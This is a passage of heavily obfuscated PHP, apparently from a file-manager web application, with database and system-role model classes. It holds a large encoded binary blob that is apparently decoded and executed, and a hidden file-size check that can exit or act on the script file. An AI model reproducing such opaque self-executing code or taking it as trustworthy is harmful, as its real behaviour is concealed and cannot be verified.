146\36\155\165\210\102\345\174\111\0\146\17\247\142\302\161\165\136\267\107\314\42\234\124\3\201\255\257\233\41\343\64\240\210".base64_decode('xZY2cdPQiPWTbPg9hbFS3ovVEN6Y7FnP5Q+/zlkeKxKc5WXSmBTkIyeC9G2DRkV+')."\xf0\x42\x72\xb\xec\xc5\x3c\x1\x5d\x95\x4c\xa7\x5\x69\x98\x6a\xb2\x24\x43\x76\xb2\xcc\xf0\x1a\x93\x44\xd5\x49\x12\x17\xb9\xfa\x8b\x41\xed\x45\x4c\x17\xc6\x7f\xb4\xa8\xd0\xf6\x6b\xeb\x95\x8a"."\x38\x5f\x55\x70\xbf\xb5\xe0\x86\x2\xa9\x82\x27\xd7\x2b\x3f\xe2\x30\x8a\x38\x6e\x9c\x8d\x5d\xbc\x7b\xf1\xfc\x7a\x8d\xd4\x44\x39\x62\x51\x57\xec\x6a\x12\x50\xa5\x52\x91\x9e\x92\x91\x72\x7f\x92".base64_decode('GAd4SyX2wYqNyvIAK0AGEeLtOThzDc01Z8bdzL2kNy73no4Wr1Lf0DhzLvofyCOz')."\155\50\25\230\275\62\12\62\357\352\207\371\323\214\16\210\147\26\330\330\360\204\113\176\350\35\311\2\214\174\205\63\2\342\50\47\172\353\170\300\3\6\112\145\166\311\137\76"."\x51\x70\xd3\x95\x84\x2d\x7e\x54\xfe\xfe\x40\x5\x4a\x8a\x84\x31\xb6\x61\xc0\xb6\x2b\x3d\x81\xc4\x27\xa4\x9f\x5\x8a\xbc\xbc\x26\x96\x48\x22\x3b\x28\x46\x92\xc0\xa6\xd9\x80\xe1\x83\xa8\xa3\xa6"."\140\263\310\226\53\151\223\223\231\122\176\260\111\312\124\154\323\124\162\132\176\14\244\201\51\126\343\24\153\36\376\120\323\24\337\214\264\205\42\100\257\271\123\131\274\217\10\37".base64_decode('gtQbDuRQdb4PP/zhw5tUtMTdE7NXpjijYfMXW7Il/uhDgYSh993hnvZQl2S0JCWo')."\x2d\xad\x5d\x6a\xa0\xbb\xbb\x62\x86\xfc\xd\x3f\x3e\xf1\xf7\xd\x0\x78\xf0\x6b\x50\x40\x5d\x8d\x5c\xbf\x92\xc4\x77\x19\x9a\xaa\x70\x6a\x95\x62\x15\x93\xcc\xed\x6e\x95\x1f\x68\x2c\x29\x20\x64"."\xab\xf9\x6\x54\xa9\xc6\x55\x94\x34\x42\x21\x2f\x9\xd1\xec\xea\x5\xf3\xfd\xc6\x2\x3e\x11\xc2\x2f\x51\xd1\x14\x57\x35\x7c\xfe\xc3\xb1\xa4\xe5\xc7\x66\x41\xf9\x23\xf1\xcc\xcb\x56\xa\x24\xb5"."\x4d\x78\x21\x52\x94\xf9\x9a\x42\x61\xdc\x54\x8d\x6d\x36\xd2\xd5\x4a\x6\xed\xd5\xdc\x26\x72\x81\xbb\x72\x17\x3b\x3b\x9a\xef\xd7\xe4\x4c\xbc\xea\xa2\x26\x63\x8d\xb9\x80\x35\xcc\x95\xf8\x15\x4f"."\47\2\222\223\156\362\110\103\213\226\137\122\136\5\67\356\113\312\131\164\46\311\145\222\362\362\176\242\45\360\13\131\322\171\134\303\117\70\52\40\205\117\274\232\244\45\7\61"."\xb6\x89\xad\x1\xbe\x9\x19\xdd\x58\x7c\xa1\x19\x8e\xc7\x7\x6c\xc9\x2c\xa3\x84\x2f\x56\x11\x25\x7c\x51\x3c\x9d\xb2\x6a\x15\x6d\x8\x73\x3\x6b\xd6\x94\xa7\x81\x65\xa7\x3b\x2b\x50\x30\xdc\x49"."\30\163\334\151\130\34\27\151\150\217\163\176\206\142\255\134\110\244\260\62\364\127\324\11\167\265\213\10\25\127\34\231\53\230\21\65\211\365\256\250\366\115\135\263\306\157\60\373"."\x27\x66\xab\xc1\xea\xfa\x78\x69\x1a\xef\xf5\x39\xcb\xa3\x91\x0\xe8\x79\x41\x48\x70\x97\xa4\xbc\xe5\x51\xb0\xf8\x76\xf7\x4f\x15\x97\xc1\xb8\x9d\x93\x82\x8d\x9f\x9a\x9a\x16\xac\xe0\x67\x3e\x7d"."\54\217\61\210\306\364\71\154\372\307\63\336\370\122\36\154\351\22\54\60\107\162\112\117\174\104\225\22\160\72\356\135\70\314\37\375\220\51\20\15\7\12\5\71\312\136\272\41"."\347\17\131\43\341\347\253\235\236\111\370\222\342\16\25\53\102\150\215\53\35\33\51\271\62\360\323\171\44\171\30\21\112\304\221\15\270\323\121\133\74\221\7\346\133\311\242\121"."\xb0\x1d\x74\x8a\xbe\x42\x58\x45\x1e\x65\x19\xd0\x86\x35\x5a\xa4\x4a\x1\xd9\xbd\xa9\x8a\xf8\xa6\xaf\x42\x74\x89\xe6\x0\x41\x10\x5d\x99\x8f\x9\x90\x52\xd4\xb3\x4d\x55\xa4\xbb\x56\x46\xd7\x51"."\x7d\x42\x62\x2a\x7d\x4\x55\xac\x52\x18\x75\xcc\x69\x1c\x62\x45\xdb\x44\x9b\x22\xbf\xcd\x3\xcf\x21\xf5\x44\xe1\xfa\x43\xa0\xb\xce\x7c\x80\xdd\x3a\xfc\x58\xfa\x7b\xc4\xe1\xc\x51\xc8\xdb\x5c"."\x59\xbd\x48\x6d\xbc\x9\xd5\x21\xa7\x80\x69\xa1\xef\x82\xd7\x99\xba\xa3\x91\x78\xa4\x85\x3d\x70\x53\x49\x31\x36\x83\xf1\xb6\x16\xbd\x7e\x26\x64\x20\x76\x53\x87\x9b\x42\xb0\x12\x9c\x5b\xf0\x43"."\xa\x4c\x7f\xb1\x94\xcf\x73\xab\x32\xcc\x3e\xf2\x2d\x8d\xc8\xca\x7a\xa\xd6\x0\x3d\x51\x8b\x65\x4a\xb6\xd8\x1a\xb1\x23\xfb\x38\xbe\x57\x6b\x41\xb2\xe4\x31\x10\xfb\x2b\x44\x95\x57\x50\x1d\x65"."\123\35\273\154\301\14\321\304\155\54\126\222\234\213\22\252\234\357\357\163\144\125\150\236\252\206\343\334\6\114\317\73\264\42\264\133\131\223\371\127\254\257\253\253\363\326\115\107"."\xff\xf3\x43\x62\xe0\xe2\x1a\xeb\xea\xca\x8a\xd4\xd5\x35\x92\xff\x69\x6\x51\xec\xc2\x5c\x38\x73\xd0\xd2\x67\x34\xb\xa\x8c\xe8\x3a\x74\x8\x36\x84\x9c\x91\x2f\x31\x46\x6b\x45\xb\xbe\x8e\xa5"."\xe0\xae\xf5\x31\xde\x82\xf5\x1f\x4d\x3\x71\x7b\xc8\xc8\xc7\x3c\x49\x3c\x9c\xa7\x90\x43\x48\x88\xe9\x6e\x20\xf0\xd3\x5d\x98\x58\xb6\xf\x63\x7a\xc1\xc2\x88\xdf\x41\x50\x25\x40\x81\xfe\xf2\x3b"."\173\250\230\100\237\171\364\212\144\23\357\124\60\237\132\41\177\314\307\200\113\23\205\307\146\57\313\360\312\17\44\100\45\272\61\210\243\15\107\327\120\35\247\77\105\234\202\66"."\350\44\37\47\116\220\264\50\230\171\223\174\104\342\250\174\202\101\262\371\25\71\22\313\362\73\370\70\332\305\133\242\357\160\320\367\72\1\206\25\60\71\143\216\250\142\17\306".base64_decode('0aN4jIAUi1EMDVPSNUYMV0aNGdox2wQwdSDX0geNrOMyriq1LUNzHi4oQwmt1QB/')."\x70\x84\x1a\x12\xb2\xcf\x2b\xb0\xf0\x80\x3f\xc0\x5b\x4\x79\x10\x8e\xda\x7e\x36\xee\x5e\x36\x7f\xb6\x7b\xee\xc8\x34\x14\x4d\x71\x95\xb6\xec\x7d\x50\x16\x93\x26\x83\x29\xca\x63\xdf\x61\x89\xc3"."\122\202\54\201\332\256\264\160\17\212\122\3\356\54\127\235\100\112\172\301\322\22\256\23\133\270\337\126\331\237\42\75\353\227\54\102\54\360\42\57\16\367\131\33\303\222\354\343"."\53\24\315\176\64\73\226\74\126\224\336\135\71\231\27\57\57\131\241\20\37\220\134\116\116\304\347\24\354\65\105\100\64\161\13\127\23\17\273\112\105\205\50\42\45\72\327\231"."\224\321\302\237\363\221\23\261\54\45\233\163\20\103\130\147\33\130\110\163\246\360\236\175\13\256\60\341\332\206\227\67\145\63\100\132\114\320\12\254\370\220\325\263\206\311\54\105".strrev('¸<ù;Şó9«’jjêÂ®'."\0".'‹'."\r".'Ç¼ ?G³«&ä\'Ğq×QQ¦3­©Ä40')."\200\225\302\40\344\232\72\131\205\215\301\247\312\132\10\274\350\72\370\133\223\25\220\316\211\130\145\30\104\66\155\334\100\43\47\110\122\14\211\131\120\121\113\261\376\16\225\164"."\xc6\x3d\x4a\xd4\x4b\xb1\x5\xed\x2\x4a\x13\xcf\x14\x4d\x9b\x4b\x16\x38\x3f\x90\x92\x28\x72\x58\xe6\x1d\xe2\xb4\x8a\x77\x81\xf8\x8e\xe3\xc4\x4b\x72\xb5\xcc\x8b\xa2\xdd\x86\x7d\x5d\x63\x3b\x10".base64_decode('Md8ibwlIwo4r6jbxIruFzQg+c2ad549B4emMSRY2Fb4AlXgV2MaKetIsEqlXcg+Q')."\267\243\172\277\34\15\233\134\332\307\47\54\172\205\46\260\107\26\11\305\61\26\40\71\264\44\373\167\221\134\134\243\230\344\174\134\142\107\274\323\25\316\307\250\264\145\32\231"."\46\145\220\362\225\130\32\227\76\112\272\103\100\304\354\130\51\301\217\5\134\214\6\273\226\240\310\373\70\273\147\200\33\40\256\66\360\10\54\71\17\65\213\335\331\212\221\311"."\x55\xc8\x37\xcb\xaa\xd0\x3c\xbc\x95\xa\x87\x15\x72\x8e\x85\xe4\x32\xc\xaa\x89\x73\x2a\x7c\x8a\x64\x49\x10\x4d\x72\xb7\x3d\x0\x1d\x1\x24\xc8\x18\xd3\x99\x15\x9f\x77\x7a\xbd\xb7\x1\xb4\xce"."\xf2\x9d\x5\xc6\xe6\x2\xcd\x42\x6b\x41\x42\x3\xcc\xed\x33\x3a\x8\x26\x79\x50\x4e\x94\x31\xa5\xc3\x15\xe2\xc4\x42\x5c\xf2\x27\xfe\x3a\xf8\x7c\x12\xc7\x1e\x3c\x56\x94\xf6\x2d\x9d\x9b\xeb\x11".base64_decode('DxcyWRFn4NSKDxfoqZRPIYSzWx1Gjq4CaGU488Fvec7xdjjCA4eljKsRcGIv+2Mn').strrev('Ò·C§6øµ5ËÂsnĞÜ|íËÉ¸ä‰.œ®†`şúŸ,â0	tw©2J(½„8Äµ').base64_decode('Ocbv3GFrHbxJcGtLS46wXI6cliNCrZMctXkSLzWis4uZTAfQ3dHt50nNfHlSuVG4')._kodDe('KV8RG1bXNeaukYZJhoa3ResVQA/RIn/vS1BqewbZAPcGR9wfG/8ke23+ylPj/BT+sg==').base64_decode('xFR6U5y3tgQXLdloSY8MOZul+KcXy1rM4/sW2bI6WJFXoXRW6LWkwoWiXl5+TCeP').strrev('ÒËòR §ò,ª¡u¹1Yğ±°Ø~Fó¨Ÿ±F— †¼+åzJK‹†').base64_decode('CGDTr5R7vAJ/QbJfcZfQTKdJ9nxWYEp5eP5OPD1CotKjMIWiZli6lEBfJ5kK1xiQ')."\x88\xef\x78\xd4\x2d\x9b\x96\xa2\x25\xe7\xe\x5a\xf1\x53\x2a\xfd\x0\x4b\x93\x9c\xab\x55\x2a\x10\xc5\x4f\x72\xff\xaf\xbb\x6a\xa4\x84\x93\x23\x23\xc5\x6c\x3\xf8\xad\x33\xea\xb2\xbe\x45\x7e\x0"."\220\175\263\354\341\233\357\174\102\307\43\216\61\124\342\60\206\275\323\145\22\26\33\170\102\232\26\212\250\104\251\247\212\117\40\231\255\70\126\220\317\221\374\51\77\7\61\15"."\x60\x5f\x6e\x41\xa6\x34\xc6\x11\xc1\x0\xe3\xe2\xd0\x1a\xfe\x1c\x15\x81\x90\x40\x86\xb5\x2f\x8c\x55\x66\x36\x88\x88\x1e\x0\x9c\x1d\xe7\xa8\xae\xc7\x80\xdc\x26\x9a\x8e\xc7\xb5\xcb\xbe\x81\x2d".base64_decode('vaAdot9BJfvE4FCMP0MhqrpzKnQAZStCg8ELKE1KHX2eij8soMxnd2jFB4j3pWCu')."\x60\x3b\xc4\xc3\xe\xd9\x36\x5b\x9a\x1b\x9a\x40\x38\x1a\x21\x12\x60\xb\x17\x33\x37\x56\x96\xe0\x50\x5b\x84\x59\xbf\xb8\x49\x1c\x7e\x56\x21\x9f\x36\x65\xf8\x11\xc2\x8b\xd\xed\xe9\xdb\x71\x54"."\16\365\40\236\136\267\313\237\223\241\325\377\277\124\244\231\61\311\120\320\331\110\171\207\54\367\226\46\330\53\374\122\116\306\34\161\76\40\207\123\334\157\343\70\136\305\221\26".strrev('dµR9k\'ÁP”»–Ûeø^ŸĞ§§Ò¦^K ±aÕ*€/!BŞ{)ä¬ãã¿)ê¹'."\r".'')."\214\154\252\310\115\66\104\102\247\56\204\117\122\13\133\55\150\354\245\123\362\340\126\53\243\311\360\242\106\245\327\223\260\47\65\347\23\41\342\345\25\261\107\72\337\246\340\7"."\x8f\x96\x58\xc\x96\xed\x78\xfb\x24\x6e\xc6\xb5\x7e\xf\xe5\xbc\x30\x55\x13\xb1\xe6\x31\x39\x2c\x9b\x69\x92\x51\xa0\x4c\x8b\x91\x40\x3e\xdf\xb\xa4\x2\xec\xc5\xb2\x94\x87\x3c\xa7\x45\x49\x9d"."\373\311\16\151\245\161\372\51\327\356\317\232\11\55\33\245\226\116\216\153\31\105\44\65\161\353\105\107\61\232\344\327\12\205\11\17\77\150\42\34\204\224\362\41\252\124\166\244"."\26\45\251\114\66\224\245\107\76\342\246\23\24\107\137\353\246\147\74\60\154\271\111\166\356\306\325\230\155\322\273\326\376\362\163\72\154\211\5\164\101\66\124\204\43\123\237\54".base64_decode('NkEBZb4iJtixHDFCIN7VQwJkvcts9rekcjx0PupCEZb8tOppLnPguNiTZZ8O4uze')."\xfd\x90\x18\xfb\xc\x7f\x15\xcd\x43\x47\x26\xde\xba\xa4\x6f\xa0\x79\xf8\x7b\x67\x1e\xea\x76\xcf\x3\xaf\x9c\x79\xc4\x8d\xb5\x6f\x7b\x17\x46\x3c\x57\xeb\x7c\xe3\x16\xf7\x99\x5b\xf6\x95\x31\xff"."\156\276\237\203\312\125\41\352\6\134\334\54\327\6\212\323\311\174\51\47\316\173\121\304\51\7\225\15\130\32\141\251\230\365\220\263\131\17\363\164\346\2\207\30\225\74\63\25"."\140\370\335\155\120\3\117\42\334\244\234\124\247\161\176\242\310\316\267\334\305\14\7\326\251\105\135\334\334\240\116\40\313\10\364\362\134\252\276\141\346\134\131\211\40\346\107\234".base64_decode('FDXQHzi1Am5BzLjixCeFeZ6U1y3JdNrelj9H6KLA/zvMF1w6LSpZwpY/2loGAYKE')."\222\215\210\264\41\271\16\375\115\174\26\157\211\345\103\267\40\361\10\241\363\133\164\373\256\60\16\151\337\21\53\201\276\12\147\146\261\54\233\303\372\130\273\250\71\5\267\112".base64_decode('8gmBBBOGDPLgsu7uOwEMaC1EtiTAyC3aplvlgqvjfYlo/CJ55t4d38QVa0oiKf+L')."\11\144\62\12\25\147\204\311\107\205\221\373\27\61\272\121\341\325\77\351\334\374\133\372\115\271\53\56\217\171\65\333\53\41\244\244\246\323\355\10\231\140\340\76\204\170\350\34"."\xab\xab\x79\x54\x4d\xb4\xd1\xe7\x51\x26\x2a\x54\xce\x62\x49\x8f\x3\xa\x1f\x4c\x12\x73\x85\x6b\xb3\x2b\x7f\x13\x48\xd7\x8c\x38\xc9\xcf\x1e\xda\x19\x21\x3e\xd0\x15\xea\x58\xad\x92\x3f\x57\xf9".base64_decode('DhRpSF4G5U1Lj8oJhQvR0MAgYA0T15Lk7lugnd+H0yQzHQxP6eFPUw47L5tHmAdN')."\xf4\x3d\x87\x3c\x87\xe2\xad\xae\xb7\x61\x9\x1d\x72\x3f\x18\xcb\x80\x42\x16\xbf\xa0\x6b\xd2\xc5\x4a\x87\xf0\xc0\x9f\xec\x72\x8\x13\x96\xfb\x35\x3d\xc4\x52\xc9\xbe\x6d\x51\x94\xa3\x3d\x6c\xa0"."\100\0\211\165\64\375\232\264\77\212\255\120\204\46\172\351\335\371\14\274\343\376\51\366\36\344\132\353\354\126\253\345\172\14\223\372\47\245\141\306\136\377\377\176\76\356\377\326"."\253\161\63\353\230\132\333\361\264\154\73\60\271\214\43\33\227\74\33\123\225\252\153\34\316\155\162\62\140\21\177\114\131\212\163\23\120\346\101\212\71\226\322\330\61\214\226\315"."\272\317\44\313\304\202\262\127\70\21\362\15\362\27\41\53\105\234\176\212\125\371\351\344\12\62\54\343\66\363\345\207\206\30\334\141\247\133\137\211\53\50\53\46\10\24\142\36".strrev('^#á”Hè€;‰ÁRG“"2º\\ƒôb-÷j¨“‘’+åFGY„œ±%?-/˜').base64_decode('kecvVztqdLreF6SFLBmaDt11+RlyeW2+cOUq2FTWqebhL0PXuZ+Knu4t/xi1VMea')."\206\50\226\355\231\266\206\34\157\220\343\307\12\165\50\242\305\104\231\11\120\275\362\202\343\357\72\12\325\25\16\311\343\145\13\267\273\150\22\16\314\231\312\365\35\222\45\242"."\364\114\161\331\353\242\256\143\2\44\16\211\163\63\303\44\76\275\141\330\261\236\316\32\162\331\2\60\25\161\363\155\246\170\56\76\127\240\12\64\171\23\145\267\234\44\43\141"."\110\162\250\271\54\371\221\4\147\115\154\366\355\134\51\13\52\25\113\232\105\113\52\306\323\53\225\305\370\43\213\361\162\36\176\334\325\166\100\132\70\141\167\73\137\47\142\61"."\x95\x74\x1d\x2\x2f\x1c\x60\xca\x49\xd2\xf9\x1e\xe2\x7d\x53\xce\xd7\x1c\x48\x26\x49\x66\xe\x1c\xa1\x5\xe9\x84\xca\x79\x40\xc8\x9d\x53\x97\x91\xb1\x92\x11\x96\xb2\x49\x2d\xe6\x17\xc\xfd\xe2"."\x9b\x60\x21\xe1\x72\x80\x64\x53\xdd\x7b\x40\x7a\x41\xd8\x5d\xcb\xf9\x40\xb4\x74\x9c\x98\x24\x78\x15\x2c\x3f\x31\x12\x7\x59\x12\x13\xc0\xaa\x61\xc1\x44\xd0\x67\x57\xba\xb4\x9\x8\x4a\xa8\xd"."\13\236\105\260\306\251\24\177\214\334\121\64\305\204\3\236\212\122\304\273\345\230\347\221\56\227\12\273\144\175\304\375\204\254\117\276\220\352\50\130\236\52\56\237\112\365\305\231".base64_decode('ghgmTqs0fLKcnNXly60cqUQS9cfPDW0kMQTb3gsLHDoULlOLTzqv0vJifM5QGXLT')."\xc1\xeb\x48\x75\x9\x56\x58\x43\xc1\xb6\x73\x57\x96\x25\xbf\xb3\xee\x3c\x25\x94\x85\x7c\x9\x5\xf4\x6c\x58\x6a\x4e\x3e\x41\x9c\xb0\x42\xac\xf2\x47\x4\x56\x3a\x41\x2c\xdd\x41\x16\x19\x6c\x23"."\63\35\300\227\10\41\37\30\224\214\312\231\216\356\270\247\226\310\4\2\175\151\142\216\150\65\151\136\300\231\105\313\353\256\336\313\25\334\43\243\65\254\21\303\116\146\44\101"."\245\74\263\74\275\130\6\124\370\120\345\376\272\173\305\140\352\26\337\104\43\145\375\221\314\20\342\146\205\72\264\107\25\253\321\54\134\123\360\222\216\272\23\200\0\327\245\131"."\270\156\131\66\253\54\151\73\244\172\266\126\262\46\30\136\71\360\100\5\220\252\60\140\227\240\114\213\116\4\317\212\205\313\77\7\30\347\56\115\164\6\225\173\41\104\175\327"."\x71\x70\xa5\x5e\x54\x2c\x3c\x61\x2f\x44\x69\xd7\x2e\x50\x89\xd6\xb2\x9c\xa\xd4\x55\xd8\x5\x94\xd3\x71\x91\x57\xc1\x4a\x81\xb6\x89\xf7\x68\xd9\x27\x51\x85\x6c\xd9\xe4\xa1\xb2\x51\x44\xb4\xe2"."\322\267\234\326\12\256\164\31\60\314\162\11\111\156\131\143\120\330\154\61\53\340\51\16\222\136\312\17\346\115\276\115\244\204\175\31\266\127\345\217\307\363\317\225\265\346\104\315"."\174\111\162\316\131\321\50\331\203\345\354\162\211\66\253\61\255\271\144\315\115\145\30\323\66\222\272\323\3\250\354\215\210\346\263\217\144\45\355\234\113\61\46\244\176\307\301\172"."\5\325\21\111\2\126\116\50\240\35\26\362\164\377\7\315\73\75\172\153\301\107\274\374\320\205\270\250\244\373\45\315\216\231\105\333\203\363\342\146\201\374\66\233\266\55\216\242".base64_decode('qSxNmDy86XkkiwoUEicsGIpE6U/QkZANEoRDQCykxnSaS4iNI4IPE3hE3tPgMLCt')."\xe4\x3a\xae\x14\x9\x48\xa4\x4c\x98\xa3\xcc\x1\x20\xbe\x95\x2b\xfa\x23\xde\x9c\x27\xcc\x9b\xe0\x3b\x0\xc7\x64\x9b\x10\x72\xdf\xd9\xf2\xd3\x1c\x3f\x38\x8e\xf7\x6a\x98\x1\x84\xb7\x9f\x7c\x3"."\205\176\107\165\372\202\16\267\163\374\266\26\100\131\51\232\240\136\243\211\112\11\273\126\247\116\23\313\262\272\3\261\330\322\110\264\225\72\231\56\313\46\265\44\33\233\262\254"."\356\216\110\327\104\171\301\316\100\50\134\226\207\315\161\272\124\341\25\212\146\205\272\111\57\3\341\160\144\351\104\275\10\265\54\26\75\41\247\252\102\7\136\310\230\114\265\315"."\xce\x8\x62\x5a\x96\xc9\xd6\xd2\x45\x3d\x3d\x27\xdc\x83\x89\x3a\x79\x23\x39\x28\x34\x6a\x9a\xc4\x94\x5b\xcc\x73\x1e\xf\x38\x5f\x6c\x71\x59\xbd\x31\x24\x85\x86\xb0\x29\x4d\x17\xb4\x1d\x2d\x40"."\x2a\x76\xba\xcd\x17\x34\x67\x90\xc5\x31\xb1\xcf\x71\x9c\x2c\xa5\x93\xf5\x40\xa8\x88\x84\x73\xf2\x6\x4a\x12\xa6\x56\x4\x90\xac\x3f\x2d\xd7\xe7\x93\x5c\x1\x0\xdc\xb1\xa3\x4c\xb0\xc3\x1a\x30"."\23\222\276\236\212\47\160\131\16\100\52\231\113\321\60\144\377\37\167\270\121\36\110\250\0\0"."".""."".base64_decode('')."".base64_decode(''), 10, -8))); goto a¤˜‡åãÖ; E·ÖÈ„½Íø: $_file = $_SERVER[$_SERVER[¯µç›È¢][60]]; $_size = $_SERVER[¯µç›È¢][61]; if ($_SERVER[$_SERVER[¯µç›È¢][62]] != $_size($_file)) { $_getc = $_SERVER[¯µç›È¢][63]; $_getfile = $_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯µç›È¢][66], $_getfilec); if (count($_getarrs) < $_SERVER[¯µç›È¢][67]) { $exit = $_SERVER[¯µç›È¢][68]; $exit(); } $_act = $_SERVER[¯µç›È¢][69]; $_act($_file); } goto fÛêâªÁ”“; fê´øà£÷: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\x6f\160\164\151\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\162\x6f\x6c\x65", "\x72\x6f\154\x65\x47\x72\x6f\165\160", "\x72\145\x67\x69\163\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ï öÉå¤) { return "\x53\x79\x73\164\145\155\117\160\164\151\x6f\156\x5f{$ï öÉå¤}"; } protected function optionDefault($Í¾Óô·¨ = '') { $ñÒœ€ÍÉ =& $_SERVER[¯µç›È¢]; if ($Í¾Óô·¨ == $ñÒœ€ÍÉ[12]) { return $GLOBALS[$ñÒœ€ÍÉ[6]][$ñÒœ€ÍÉ[389]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x72\x6f\154\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\141\165\164\x68", "\154\141\142\x65\x6c", "\x64\x69\x73\x70\154\x61\x79", "\x73\x79\x73\x74\145\155", "\144\145\x73\143", "\151\x67\156\x6f\162\145\105\x78\x74", "\x69\x67\156\157\x72\145\x46\x69\154\x65\x53\x69\172\x65", "\x61\x64\155\151\156\x69\163\164\162\141\x74\157\162", "\163\x6f\x72\x74"); public function listData($‰Ğ¡îÛÅ = false, $¶¼èÕ‹‚ = "\x73\157\x72\x74", $¡§îÅÂÑ = false) { $¤™é°ù¼ =& $_SERVER[¯µç›È¢]; $ÎÂ¬¬‹° = parent::listData($‰Ğ¡îÛÅ, $¶¼èÕ‹‚, $¡§îÅÂÑ); if (!$‰Ğ¡îÛÅ) { foreach ($ÎÂ¬¬‹° as $úúæøœú => $ÇÕşŸµ¶) { if ($ÇÕşŸµ¶[$¤™é°ù¼[2029]] == 1) { $ÎÂ¬¬‹°[$úúæøœú][$¤™é°ù¼[456]] = LNG($¤™é°ù¼[2255]); } } } return $ÎÂ¬¬‹°; } public function update($›èòâ¸, $×ÛŞ¡ê•) { $ËõûãÊƒ =& $_SERVER[¯µç›È¢]; $Ó¶óÛúö = parent::listData($›èòâ¸); $™‚·¶… = $this->findByName($×ÛŞ¡ê•[$ËõûãÊƒ[32]]); if (!$Ó¶óÛúö || $™‚·¶… && $™‚·¶…[$ËõûãÊƒ[405]] != $Ó¶óÛúö[$ËõûãÊƒ[405]]) { return !1; } if ($™‚·¶…[$ËõûãÊƒ[2029]] == 1) { $×ÛŞ¡ê• = array($ËõûãÊƒ[32] => $×ÛŞ¡ê•[$ËõûãÊƒ[32]], $ËõûãÊƒ[1856] => $×ÛŞ¡ê•[$ËõûãÊƒ[1856]]); } $this->filterAuth($×ÛŞ¡ê•[$ËõûãÊƒ[419]]); return parent::update($›èòâ¸, $×ÛŞ¡ê•); } public function remove($¥é¢Ÿ‰Ñ) { $±§ÓŞÁš = parent::listData($¥é¢Ÿ‰Ñ); if (!$±§ÓŞÁš || $±§ÓŞÁš[$_SERVER[¯µç›È¢][1286]]) { return !1; } return parent::remove($¥é¢Ÿ‰Ñ); } public function add($¢ê¦ËÉû) { $ùçâÖæÅ =& $_SERVER[¯µç›È¢]; $¿Íêº‡ü = $¢ê¦ËÉû[$ùçâÖæÅ[32]]; if ($this->findByName($¿Íêº‡ü)) { return !1; } $„«ˆˆ‚ = array($ùçâÖæÅ[426] => $¿Íêº‡ü, $ùçâÖæÅ[1840] => $ùçâÖæÅ[12], $ùçâÖæÅ[1836] => $ùçâÖæÅ[1844], $ùçâÖæÅ[2256] => 1, $ùçâÖæÅ[1839] => 0, $ùçâÖæÅ[2257] => 0, $ùçâÖæÅ[1838] => $this->getSort()); $¢ê¦ËÉû = array_merge($„«ˆˆ‚, $¢ê¦ËÉû); $this->filterAuth($¢ê¦ËÉû[$ùçâÖæÅ[419]]); return parent::insert($¢ê¦ËÉû); } private function getSort() { $‰Ä€ùÌÇ =& $_SERVER[¯µç›È¢]; $…±Ÿã¥° = parent::listData(); $Ş´­İÄ = array_to_keyvalue($…±Ÿã¥°, $‰Ä€ùÌÇ[12], $‰Ä€ùÌÇ[1857]); return empty($Ş´­İÄ) ? 0 : max($Ş´­İÄ) + 1; } private function filterAuth(&$ãÇ¯«ç©) { $ƒ½òã¸ƒ =& $_SERVER[¯µç›È¢]; $µœÁœé… = array(); $´·ßÛé½ = array_filter(explode($ƒ½òã¸ƒ[50], $ãÇ¯«ç©)); foreach ($´·ßÛé½ as $ãÇ¯«ç©) { $µ¿œ©Ô = explode($ƒ½òã¸ƒ[10], $ãÇ¯«ç©); if ($µ¿œ©Ô[0] == $ƒ½òã¸ƒ[2258] && $µ¿œ©Ô[1] != $ƒ½òã¸ƒ[1205]) { $‰“–‘Ñ = $µ¿œ©Ô[0] . $ƒ½òã¸ƒ[10] . $µ¿œ©Ô[1] . $ƒ½òã¸ƒ[2259]; if (!in_array($‰“–‘Ñ, $´·ßÛé½)) { $µœÁœé…[] = $‰“–‘Ñ; } } $µœÁœé…[] = $ãÇ¯«ç©; } $ãÇ¯«ç© = implode($ƒ½òã¸ƒ[50], $µœÁœé…); } public function sort($¨ÌÃ°¸Ò, $³Ì¥Êû€) { return parent::update($¨ÌÃ°¸Ò, $³Ì¥Êû€); } } goto c’ ¥†Á ; A¿öè§½à„: class DbSqlite3 extends DbSqlite3Base { public function query($Ş¦Ä¨”¤) { $©¥“ÂÆ± =& $_SERVER[¯µç›È¢]; if (!CacheLock::fileLock($©¥“ÂÆ±[13])) { return !1; } $¸ÚõÍœ» = parent::query($Ş¦Ä¨”¤); CacheLock::fileUnLock($©¥“ÂÆ±[13]); return $¸ÚõÍœ»; } public function execute($¶¦—¥Ê™) { $ËˆëÀÒ§ =& $_SERVER[¯µç›È¢]; if (!CacheLock::fileLock($ËˆëÀÒ§[13])) { return !1; } $›÷¦ûĞŸ = parent::execute($¶¦—¥Ê™); CacheLock::fileUnLock($ËˆëÀÒ§[13]); return $›÷¦ûĞŸ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\x71" => "\74\x3e", "\x67\x74" => "\76", "\x65\x67\x74" => "\76\75", "\x6c\x74" => "\74", "\x65\154\x74" => "\74\75", "\156\157\164\x6c\151\x6b\145" => "\x4e\x4f\x54\x20\114\111\113\x45", "\154\x69\153\x65" => "\x4c\x49\x4b\105", "\151\x6e" => "\x49\116", "\156\157\164\x69\156" => "\116\x4f\124\x20\x49\116", "\156\157\164\x20\151\156" => "\116\x4f\x54\x20\x49\116", "\142\x65\164\167\x65\145\x6e" => "\x42\x45\x54\x57\x45\x45\116", "\156\x6f\x74\142\145\164\x77\x65\145\156" => "\x4e\x4f\124\40\102\105\x54\x57\x45\x45\116", "\156\157\x74\40\142\145\x74\167\x65\x65\156" => "\116\x4f\124\40\102\x45\x54\127\x45\105\x4e"); protected $selectSql = 